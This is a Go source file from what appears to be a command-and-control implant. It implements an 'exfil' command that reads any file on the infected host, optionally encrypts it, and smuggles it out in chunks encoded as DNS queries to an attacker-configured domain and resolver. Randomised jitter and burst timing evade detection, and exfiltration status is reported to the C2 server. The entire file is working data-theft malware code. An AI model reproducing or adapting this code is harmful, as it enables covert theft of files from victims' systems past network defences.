package main

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

const (
	exfilEnvelopeVersion = 1
	exfilEnvelopeLen     = 9 // version(1) + flags(1) + tag(3) + counter(4)
	exfilAESOverhead     = 28
	exfilLabelMax        = 62
	exfilFQDNMax         = 253
	exfilLabelPrefix     = "EX"
	exfilPadLabel        = "0"
	exfilTagPrefix       = "E"

	exfilFlagInit     = 0x01
	exfilFlagChunk    = 0x02
	exfilFlagComplete = 0x04
	exfilFlagMetadata = 0x08
	exfilFlagFinal    = 0x10

	exfilMetaFlagHeader   = 0x01
	exfilHeaderChunkIndex = 0xFFFFFFFF
	exfilMetaVersion      = 1
)

type exfilOpts struct {
	FilePath   string
	BurstMs    int
	MinJitter  int
	MaxJitter  int
	BurstPkt   int
	MaxPayload int
	QueryType  string
	Resolver   string
	Encrypted  bool
}

func parseExfilCommand(args string) (*exfilOpts, error) {
	opts := &exfilOpts{
		BurstMs:   5000,
		MinJitter: 100,
		MaxJitter: 500,
		BurstPkt:  10,
		QueryType: "TXT",
	}

	tokens := tokenizeArgs(args)
	if len(tokens) == 0 {
		return nil, fmt.Errorf("usage: exfil <filepath> [--burst-ms N] [--min-jitter N] [--max-jitter N] [--burst-pkt N] [--max-payload N] [--txt|--a] [--resolver addr] [--encrypted]")
	}
	opts.FilePath = tokens[0]

	for i := 1; i < len(tokens); i++ {
		switch tokens[i] {
		case "--burst-ms":
			i++
			if i < len(tokens) {
				if v, err := strconv.Atoi(tokens[i]); err == nil {
					opts.BurstMs = v
				}
			}
		case "--min-jitter":
			i++
			if i < len(tokens) {
				if v, err := strconv.Atoi(tokens[i]); err == nil {
					opts.MinJitter = v
				}
			}
		case "--max-jitter":
			i++
			if i < len(tokens) {
				if v, err := strconv.Atoi(tokens[i]); err == nil {
					opts.MaxJitter = v
				}
			}
		case "--burst-pkt":
			i++
			if i < len(tokens) {
				if v, err := strconv.Atoi(tokens[i]); err == nil {
					opts.BurstPkt = v
				}
			}
		case "--max-payload":
			i++
			if i < len(tokens) {
				if v, err := strconv.Atoi(tokens[i]); err == nil {
					opts.MaxPayload = v
				}
			}
		case "--txt":
			opts.QueryType = "TXT"
		case "--a":
			opts.QueryType = "A"
		case "--resolver":
			i++
			if i < len(tokens) {
				opts.Resolver = tokens[i]
			}
		case "--encrypted":
			opts.Encrypted = true
		}
	}

	if opts.MaxJitter < opts.MinJitter {
		opts.MaxJitter = opts.MinJitter + 500
	}
	if opts.BurstPkt < 1 {
		opts.BurstPkt = 1
	}

	return opts, nil
}

func tokenizeArgs(s string) []string {
	var tokens []string
	var cur strings.Builder
	inQuote := false
	var qc byte

	for i := 0; i < len(s); i++ {
		ch := s[i]
		if inQuote {
			if ch == qc {
				inQuote = false
			} else {
				cur.WriteByte(ch)
			}
		} else if ch == '"' || ch == '\'' {
			inQuote = true
			qc = ch
		} else if ch == ' ' || ch == '\t' {
			if cur.Len() > 0 {
				tokens = append(tokens, cur.String())
				cur.Reset()
			}
		} else {
			cur.WriteByte(ch)
		}
	}
	if cur.Len() > 0 {
		tokens = append(tokens, cur.String())
	}
	return tokens
}

func genExfilSessionTag() string {
	const charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, 2)
	if _, err := rand.Read(b); err != nil {
		panic(fmt.Sprintf("CSPRNG failure: %v", err))
	}
	return fmt.Sprintf("%s%c%c", exfilTagPrefix, charset[b[0]%36], charset[b[1]%36])
}

func genExfilSessionID() uint32 {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		panic(fmt.Sprintf("CSPRNG failure: %v", err))
	}
	return binary.LittleEndian.Uint32(b)
}

func buildExfilEnvelope(flags uint8, tag string, counter uint32) []byte {
	env := make([]byte, exfilEnvelopeLen)
	env[0] = exfilEnvelopeVersion
	env[1] = flags
	copy(env[2:5], []byte(tag))
	binary.LittleEndian.PutUint32(env[5:9], counter)
	return env
}

func buildExfilMetaBinary(sessionID, totalChunks uint32, fileSize uint64, fileName string) []byte {
	name := []byte(fileName)
	if len(name) > 63 {
		name = name[:63]
	}
	buf := make([]byte, 29+len(name))
	buf[0] = exfilMetaVersion
	buf[1] = exfilMetaFlagHeader
	binary.LittleEndian.PutUint32(buf[2:6], sessionID)
	binary.LittleEndian.PutUint32(buf[6:10], 0)
	binary.LittleEndian.PutUint32(buf[10:14], exfilHeaderChunkIndex)
	binary.LittleEndian.PutUint32(buf[14:18], totalChunks)
	binary.LittleEndian.PutUint16(buf[18:20], 0)
	binary.LittleEndian.PutUint64(buf[20:28], fileSize)
	buf[28] = byte(len(name))
	copy(buf[29:], name)
	return buf
}

func exfilEncryptPayload(data, aesKey []byte, encrypt bool) (string, error) {
	if encrypt {
		ct, err := encryptAESGCM(data, aesKey)
		if err != nil {
			return "", err
		}
		return base36Encode(ct), nil
	}
	return base36Encode(data), nil
}

func exfilBuildEnvLabel(flags uint8, tag string, counter uint32, aesKey []byte, encrypt bool) (string, error) {
	env := buildExfilEnvelope(flags, tag, counter)
	enc, err := exfilEncryptPayload(env, aesKey, encrypt)
	if err != nil {
		return "", err
	}
	return exfilLabelPrefix + enc, nil
}

func exfilBuildPayloadLabels(data, aesKey []byte, encrypt bool) ([]string, error) {
	if len(data) == 0 {
		return []string{exfilPadLabel}, nil
	}
	enc, err := exfilEncryptPayload(data, aesKey, encrypt)
	if err != nil {
		return nil, err
	}
	return exfilSplitLabels(enc), nil
}

func exfilSplitLabels(s string) []string {
	if s == "" {
		return []string{exfilPadLabel}
	}
	var labels []string
	for len(s) > 0 {
		n := len(s)
		if n > exfilLabelMax {
			n = exfilLabelMax
		}
		labels = append(labels, s[:n])
		s = s[n:]
	}
	return labels
}

func exfilBuildFQDN(envLabel string, payLabels []string, domain string) string {
	parts := make([]string, 0, 2+len(payLabels))
	parts = append(parts, envLabel)
	parts = append(parts, payLabels...)
	parts = append(parts, domain)
	return strings.Join(parts, ".")
}

func exfilMaxRawPerFrame(envLabelLen, domainLen int, encrypt bool) int {
	avail := exfilFQDNMax - envLabelLen - 1 - domainLen - 1
	if avail < 3 {
		return 0
	}
	nLabels := (avail + 1) / (exfilLabelMax + 1)
	if nLabels < 1 {
		nLabels = 1
	}
	b36Cap := nLabels * exfilLabelMax
	if b36Cap+(nLabels-1) > avail {
		b36Cap = avail - (nLabels - 1)
	}
	raw := int(float64(b36Cap)*0.64) - 1 // sentinel byte
	if encrypt {
		raw -= exfilAESOverhead
	}
	if raw < 1 {
		return 1
	}
	return raw
}

func exfilSendQuery(resolver *net.Resolver, fqdn, qtype string, timeout int) (bool, error) {
	if timeout <= 0 {
		timeout = 10
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	if resolver == nil {
		resolver = net.DefaultResolver
	}

	switch qtype {
	case "TXT":
		records, err := resolver.LookupTXT(ctx, fqdn)
		if err != nil {
			return false, err
		}
		for _, r := range records {
			if strings.TrimSpace(r) == "ACK" {
				return true, nil
			}
		}
		return false, nil
	default:
		addrs, err := resolver.LookupIP(ctx, "ip4", fqdn)
		if err != nil {
			return false, err
		}
		for _, addr := range addrs {
			if addr.String() != "192.0.2.1" {
				return true, nil
			}
		}
		return false, nil
	}
}

func exfilRandInt(max int64) int64 {
	if max <= 0 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(max))
	if err != nil || n == nil {
		return max / 2
	}
	return n.Int64()
}

func (b *Beacon) handleExfilCommand(args string) string {
	opts, err := parseExfilCommand(args)
	if err != nil {
		return fmt.Sprintf("exfil error: %v", err)
	}
	return b.runExfil(opts)
}

func (b *Beacon) runExfil(opts *exfilOpts) string {
	data, err := os.ReadFile(opts.FilePath)
	if err != nil {
		return fmt.Sprintf("exfil error: %v", err)
	}

	aesKey := b.client.aesKey
	enc := opts.Encrypted
	tag := genExfilSessionTag()
	sid := genExfilSessionID()
	fileName := filepath.Base(opts.FilePath)

	domains := b.client.config.GetDomains()
	if len(domains) == 0 {
		return "exfil error: no domains configured"
	}
	domain := domains[0]

	resolverAddr := opts.Resolver
	if resolverAddr == "" {
		resolverAddr = b.client.config.DNSServer
	}
	var resolver *net.Resolver
	if resolverAddr != "" {
		if !strings.Contains(resolverAddr, ":") {
			resolverAddr += ":53"
		}
		resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{Timeout: 10 * time.Second}
				return d.DialContext(ctx, "udp", resolverAddr)
			},
		}
	}

	timeout := b.client.config.Timeout

	testLabel, err := exfilBuildEnvLabel(exfilFlagChunk, tag, 1, aesKey, enc)
	if err != nil {
		return fmt.Sprintf("exfil error: %v", err)
	}
	maxRaw := exfilMaxRawPerFrame(len(testLabel), len(domain), enc)
	if opts.MaxPayload > 0 && opts.MaxPayload < maxRaw {
		maxRaw = opts.MaxPayload
	}
	if maxRaw < 1 {
		return "exfil error: domain too long for DNS exfil"
	}

	totalChunks := (len(data) + maxRaw - 1) / maxRaw

	metaBin := buildExfilMetaBinary(sid, uint32(totalChunks), uint64(len(data)), fileName)
	metaSegments := (len(metaBin) + maxRaw - 1) / maxRaw
	if metaSegments < 1 {
		metaSegments = 1
	}

	totalFrames := 1 + metaSegments + totalChunks + 1

	sendFrame := func(flags uint8, counter uint32, payload []byte, retries int) error {
		for attempt := 1; attempt <= retries; attempt++ {
			el, err := exfilBuildEnvLabel(flags, tag, counter, aesKey, enc)
			if err != nil {
				return err
			}
			var pl []string
			if len(payload) == 0 {
				pl = []string{exfilPadLabel}
			} else {
				pl, err = exfilBuildPayloadLabels(payload, aesKey, enc)
				if err != nil {
					return err
				}
			}
			fqdn := exfilBuildFQDN(el, pl, domain)
			if len(fqdn) > exfilFQDNMax {
				return fmt.Errorf("FQDN %d chars exceeds %d limit", len(fqdn), exfilFQDNMax)
			}
			acked, qErr := exfilSendQuery(resolver, fqdn, opts.QueryType, timeout)
			if qErr == nil && acked {
				return nil
			}
			if attempt < retries {
				time.Sleep(time.Duration(attempt) * time.Second)
			}
		}
		return fmt.Errorf("no ACK after retries")
	}

	// Signal exfiltrating status to C2 (use registration phase encoding for STATUS)
	statusPhase := b.client.config.GetRegistrationPhase()
	b.client.sendPhaseCommand(fmt.Sprintf("STATUS|%s|exfiltrating", b.id), statusPhase)

	// Phase 1: INIT
	if err := sendFrame(exfilFlagInit, uint32(totalFrames), nil, 3); err != nil {
		b.client.sendPhaseCommand(fmt.Sprintf("STATUS|%s|active", b.id), statusPhase)
		return fmt.Sprintf("exfil INIT failed: %v", err)
	}

	// Phase 2: METADATA
	for seg := 0; seg < metaSegments; seg++ {
		start := seg * maxRaw
		end := start + maxRaw
		if end > len(metaBin) {
			end = len(metaBin)
		}
		flags := uint8(exfilFlagChunk | exfilFlagMetadata)
		if seg == metaSegments-1 {
			flags |= exfilFlagFinal
		}
		if err := sendFrame(flags, uint32(seg), metaBin[start:end], 3); err != nil {
			b.client.sendPhaseCommand(fmt.Sprintf("STATUS|%s|active", b.id), statusPhase)
			return fmt.Sprintf("exfil METADATA failed (seg %d): %v", seg, err)
		}
	}

	// Phase 3: DATA
	// Abort threshold: if >50% of chunks sent so far have failed, bail out
	failed := 0
	aborted := false
	for i := 0; i < totalChunks; i++ {
		start := i * maxRaw
		end := start + maxRaw
		if end > len(data) {
			end = len(data)
		}
		flags := uint8(exfilFlagChunk)
		if i == totalChunks-1 {
			flags |= exfilFlagFinal
		}
		if err := sendFrame(flags, uint32(i+1), data[start:end], 2); err != nil {
			failed++
		}

		sent := i + 1
		if sent >= 6 && failed > sent/2 {
			aborted = true
			break
		}

		if (i+1)%opts.BurstPkt == 0 && i+1 < totalChunks {
			jitter := opts.MinJitter + int(exfilRandInt(int64(opts.MaxJitter-opts.MinJitter+1)))
			time.Sleep(time.Duration(jitter+opts.BurstMs) * time.Millisecond)
		} else if i+1 < totalChunks {
			jitter := opts.MinJitter + int(exfilRandInt(int64(opts.MaxJitter-opts.MinJitter+1)))
			time.Sleep(time.Duration(jitter) * time.Millisecond)
		}
	}

	if !aborted {
		// Phase 4: COMPLETE
		sendFrame(exfilFlagComplete, 0, nil, 3)
	}

	// Restore active status so beacon resumes normal polling
	b.client.sendPhaseCommand(fmt.Sprintf("STATUS|%s|active", b.id), statusPhase)

	if aborted {
		return fmt.Sprintf("exfil aborted: %s (%d/%d chunks failed, session %s) — resuming beacon", fileName, failed, totalChunks, tag)
	}
	if failed > 0 {
		return fmt.Sprintf("exfil done: %s (%d bytes, %d/%d chunks failed, session %s)", fileName, len(data), failed, totalChunks, tag)
	}
	return fmt.Sprintf("exfil done: %s (%d bytes, %d chunks, session %s)", fileName, len(data), totalChunks, tag)
}
